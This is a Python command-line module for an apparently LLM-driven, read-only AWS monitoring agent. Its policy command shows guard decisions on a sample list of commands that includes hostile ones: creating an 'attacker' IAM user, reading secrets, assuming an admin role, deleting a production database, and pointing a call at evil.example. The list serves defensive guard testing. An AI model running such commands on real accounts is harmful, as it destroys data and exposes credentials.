"""Command-line interface — the single entry point for every stage."""

from __future__ import annotations

import argparse
import json
import sys
from typing import Any

from . import audit, doctor, guard, knowledge, loop, memory, reports
from .config import get_config
from .llm import LLMUnavailable
from .tools import REGISTRY, dispatch


def _fail(payload: dict[str, Any]) -> int:
    """Report a tool that could not run at all, with the reason it gave."""
    print(f"\033[31m{payload.get('error', 'the tool could not run')}\033[0m", file=sys.stderr)
    return 1


def _print(payload: Any, as_json: bool) -> None:
    if as_json or not isinstance(payload, str):
        print(json.dumps(payload, indent=2, default=str))
    else:
        print(payload)


# --- stage 1 ---------------------------------------------------------------


def cmd_doctor(args: argparse.Namespace) -> int:
    checks = doctor.run_checks()
    if args.json:
        print(json.dumps(checks, indent=2))
    else:
        print(doctor.render(checks))
    return doctor.exit_code(checks)


# --- stage 2 / 3 -----------------------------------------------------------


def cmd_ask(args: argparse.Namespace) -> int:
    question = " ".join(args.question).strip()
    if not question:
        print("nothing to ask — pass a question", file=sys.stderr)
        return 2
    try:
        result = loop.ask(
            question,
            session=args.session,
            use_tools=not args.no_tools,
            stream_to_stdout=not args.json,
        )
    except LLMUnavailable as exc:
        print(f"\033[31m{exc}\033[0m", file=sys.stderr)
        return 3
    if args.json:
        print(json.dumps(result.as_dict(), indent=2, default=str))
    else:
        print(
            f"\n\033[90m[{result.iterations} model turns · {len(result.tool_calls)} tool calls · "
            f"~${result.usage.get('estimated_cost_usd', 0)}]\033[0m"
        )
    return 0


def cmd_chat(args: argparse.Namespace) -> int:
    loop.chat(session=args.session)
    return 0


# --- stage 3 / 5 (direct tools, no model in the loop) ----------------------


def cmd_inventory(args: argparse.Namespace) -> int:
    payload = dispatch("aws_inventory", {"include_empty": args.include_empty})
    if not payload.get("ok"):
        return _fail(payload)
    if args.json:
        _print(payload, True)
        return 0
    print(f"\nResource inventory — region {payload.get('region')}")
    print("-" * 52)
    for name, count in sorted(payload.get("counts", {}).items(), key=lambda kv: -kv[1]):
        print(f"  {name:<32} {count:>6}")
    print("-" * 52)
    print(f"  {'TOTAL':<32} {payload.get('total_resources', 0):>6}\n")
    for entry in payload.get("unavailable", []):
        print(f"  not visible: {entry['resource']} ({entry['status']})")
    return 0


def cmd_health(args: argparse.Namespace) -> int:
    payload = dispatch("aws_health", {"checks": args.checks} if args.checks else {})
    if not payload.get("ok"):
        return _fail(payload)
    if args.json:
        _print(payload, True)
    else:
        print(f"\nHealth — region {payload.get('region')}: {str(payload.get('overall')).upper()}")
        for name, result in (payload.get("checks") or {}).items():
            print(f"  [{str(result.get('status', '?')).upper():<8}] {name}")
        if payload.get("degraded_checks"):
            print(f"\n  degraded: {', '.join(payload['degraded_checks'])}")
    return 1 if payload.get("overall") == "unhealthy" else 0


def cmd_cost(args: argparse.Namespace) -> int:
    payload = dispatch("aws_cost", {"days": args.days, "group_by": args.group_by})
    if args.json or not payload.get("ok"):
        _print(payload, True)
        return 0 if payload.get("ok") else 1
    print(f"\nSpend, last {payload['window_days']} days: ${payload['total']} {payload['currency']}")
    for row in payload.get("top", []):
        print(f"  {row['key']:<44} ${row['cost']:>10.2f}")
    if payload.get("trend"):
        print(f"\n  day over day: {payload['trend']['day_over_day_pct']:+.1f}%")
    return 0


def cmd_logs(args: argparse.Namespace) -> int:
    _print(
        dispatch(
            "aws_logs",
            {
                "log_group": args.log_group,
                "pattern": args.pattern,
                "minutes": args.minutes,
                "limit": args.limit,
            },
        ),
        True,
    )
    return 0


def cmd_security(args: argparse.Namespace) -> int:
    payload = dispatch("aws_security_posture", {})
    if not payload.get("ok"):
        return _fail(payload)
    if args.json:
        _print(payload, True)
        return 0
    print(f"\nSecurity posture — region {payload.get('region')}")
    counts = payload.get("by_severity", {})
    print(
        f"  {payload.get('finding_count', 0)} findings "
        f"({counts.get('high', 0)} high, {counts.get('medium', 0)} medium)\n"
    )
    for finding in payload.get("findings", []):
        print(f"  [{finding['severity'].upper():<6}] {finding['type']}")
        print(f"           {finding['resource']}: {finding['detail']}")
    for skipped in payload.get("checks_skipped", []):
        print(f"  skipped {skipped['check']}: {skipped['reason']}")
    return 1 if counts.get("high") else 0


def cmd_report(args: argparse.Namespace) -> int:
    payload = reports.status_report(include_cost=not args.no_cost, include_security=args.security)
    if args.json:
        _print(payload, True)
    else:
        print(reports.render_text(payload))
    return 0


def cmd_run_tool(args: argparse.Namespace) -> int:
    payload = json.loads(args.input) if args.input else {}
    _print(dispatch(args.name, payload), True)
    return 0


def cmd_tools(args: argparse.Namespace) -> int:
    if args.json:
        _print([t.spec() for t in REGISTRY.values()], True)
        return 0
    print("\nRegistered tools\n" + "-" * 60)
    for name, entry in sorted(REGISTRY.items()):
        print(f"  stage {entry.stage}  {name:<24} {entry.description.split('.')[0][:70]}")
    print()
    return 0


# --- stage 6 ---------------------------------------------------------------


def cmd_memory(args: argparse.Namespace) -> int:
    if args.action == "list":
        _print({"facts": memory.recall(args.query or ""), "sessions": memory.list_sessions()}, True)
    elif args.action == "add":
        if not args.key or not args.value:
            print("--key and --value are required for `memory add`", file=sys.stderr)
            return 2
        _print(memory.remember(args.key, args.value, scope=args.scope, source="operator"), True)
    elif args.action == "forget":
        _print({"deleted": memory.forget(args.key or "", scope=args.scope)}, True)
    elif args.action == "clear-session":
        _print({"cleared_turns": memory.clear_session(args.session)}, True)
    return 0


def cmd_knowledge(args: argparse.Namespace) -> int:
    kb = knowledge.get_kb(reload=True)
    if args.query:
        _print({"query": args.query, "passages": kb.search(args.query, limit=args.limit)}, True)
    else:
        _print(kb.stats(), True)
    return 0


# --- stage 7 ---------------------------------------------------------------


def cmd_policy(args: argparse.Namespace) -> int:
    """Show what the guard would decide, without calling AWS."""
    if args.command:
        decision = guard.explain(" ".join(args.command))
        _print(
            {"command": " ".join(args.command), "verdict": decision.verdict.value, "reason": decision.reason},
            True,
        )
        return 0 if decision.verdict is not guard.Verdict.DENY else 1

    samples = [
        "aws ec2 describe-instances",
        "aws s3api list-buckets",
        "aws cloudwatch describe-alarms",
        "aws logs filter-log-events --log-group-name /aws/lambda/x",
        "aws ce get-cost-and-usage",
        "aws iam get-credential-report",
        "aws lambda get-function --function-name x",
        "aws ec2 run-instances --image-id ami-1",
        "aws ec2 terminate-instances --instance-ids i-1",
        "aws s3 rm s3://bucket/key",
        "aws rds delete-db-instance --db-instance-identifier prod",
        "aws iam create-user --user-name attacker",
        "aws secretsmanager get-secret-value --secret-id prod/db",
        "aws sts assume-role --role-arn arn:aws:iam::1:role/admin --role-session-name x",
        "aws ecr get-login-password",
        "aws ec2 describe-instances --endpoint-url http://evil.example",
        "aws ssm start-session --target i-1",
    ]
    print("\nPolicy decisions (nothing is executed)\n" + "-" * 72)
    colours = {"allow": "\033[32m", "sensitive": "\033[33m", "deny": "\033[31m"}
    for sample in samples:
        decision = guard.explain(sample)
        colour = colours[decision.verdict.value]
        print(f" {colour}{decision.verdict.value.upper():<9}\033[0m {sample}")
        print(f"           {decision.reason}")
    print("-" * 72)
    print(" ALLOW = runs immediately · SENSITIVE = needs human approval · DENY = never runs\n")
    return 0


def cmd_audit(args: argparse.Namespace) -> int:
    entries = audit.tail(args.limit)
    if args.json:
        _print(entries, True)
        return 0
    if not entries:
        print("no audit entries yet")
        return 0
    for entry in entries:
        extra = entry.get("command") or entry.get("tool") or entry.get("question", "")
        print(f"  {entry['ts']}  {entry['event']:<18} {str(extra)[:90]}")
    return 0


# --- stage 4 / 8 -----------------------------------------------------------


def cmd_serve(args: argparse.Namespace) -> int:
    from .server import serve

    serve(host=args.host, port=args.port)
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="agent",
        description="Read-only AWS monitoring agent — status, health and resource counts, "
        "collected through the AWS CLI.",
    )
    parser.add_argument("--json", action="store_true", help="machine-readable output")
    parser.add_argument("--region", help="override AWS_REGION for this invocation")
    sub = parser.add_subparsers(dest="command", required=True)

    p = sub.add_parser("doctor", help="STAGE 1: check this machine is ready")
    p.set_defaults(func=cmd_doctor)

    p = sub.add_parser("ask", help="STAGE 2/3: ask the agent a question")
    p.add_argument("question", nargs="+")
    p.add_argument("--session", default=None, help="persist this conversation under a name")
    p.add_argument("--no-tools", action="store_true", help="answer without AWS access (stage 2 mode)")
    p.set_defaults(func=cmd_ask)

    p = sub.add_parser("chat", help="STAGE 2/3: interactive session")
    p.add_argument("--session", default="default")
    p.set_defaults(func=cmd_chat)

    p = sub.add_parser("inventory", help="STAGE 3: count resources in the region")
    p.add_argument("--include-empty", action="store_true")
    p.set_defaults(func=cmd_inventory)

    p = sub.add_parser("health", help="STAGE 3: run the health sweep")
    p.add_argument("--checks", nargs="*", help="subset: alarms ec2 rds asg load_balancers ecs")
    p.set_defaults(func=cmd_health)

    p = sub.add_parser("cost", help="STAGE 5: spend breakdown")
    p.add_argument("--days", type=int, default=7)
    p.add_argument("--group-by", default="SERVICE")
    p.set_defaults(func=cmd_cost)

    p = sub.add_parser("logs", help="STAGE 5: search CloudWatch Logs")
    p.add_argument("--log-group", default=None)
    p.add_argument("--pattern", default="ERROR")
    p.add_argument("--minutes", type=int, default=60)
    p.add_argument("--limit", type=int, default=25)
    p.set_defaults(func=cmd_logs)

    p = sub.add_parser("security", help="STAGE 5: read-only security posture review")
    p.set_defaults(func=cmd_security)

    p = sub.add_parser("report", help="STAGE 5: full status report")
    p.add_argument("--no-cost", action="store_true")
    p.add_argument("--security", action="store_true")
    p.set_defaults(func=cmd_report)

    p = sub.add_parser("tools", help="list the tools available to the model")
    p.set_defaults(func=cmd_tools)

    p = sub.add_parser("run-tool", help="invoke one tool directly (no model)")
    p.add_argument("name")
    p.add_argument("--input", default="", help="JSON object of tool arguments")
    p.set_defaults(func=cmd_run_tool)

    p = sub.add_parser("memory", help="STAGE 6: inspect or edit stored facts")
    p.add_argument("action", choices=["list", "add", "forget", "clear-session"])
    p.add_argument("--key")
    p.add_argument("--value")
    p.add_argument("--scope", default="global")
    p.add_argument("--query", default="")
    p.add_argument("--session", default="default")
    p.set_defaults(func=cmd_memory)

    p = sub.add_parser("knowledge", help="STAGE 6: search the runbooks")
    p.add_argument("query", nargs="?", default="")
    p.add_argument("--limit", type=int, default=4)
    p.set_defaults(func=cmd_knowledge)

    p = sub.add_parser("policy", help="STAGE 7: show what the guard allows and denies")
    p.add_argument("command", nargs="*", help="optional command to evaluate, e.g. ec2 describe-vpcs")
    p.set_defaults(func=cmd_policy)

    p = sub.add_parser("audit", help="STAGE 7: tail the audit log")
    p.add_argument("--limit", type=int, default=25)
    p.set_defaults(func=cmd_audit)

    p = sub.add_parser("serve", help="STAGE 4/8: run the HTTP API")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=8080)
    p.set_defaults(func=cmd_serve)

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if getattr(args, "region", None):
        import os

        os.environ["AWS_REGION"] = args.region
        get_config(reload=True)
    try:
        return int(args.func(args) or 0)
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        return 130
    except LLMUnavailable as exc:
        print(f"\033[31m{exc}\033[0m", file=sys.stderr)
        return 3


if __name__ == "__main__":
    raise SystemExit(main())
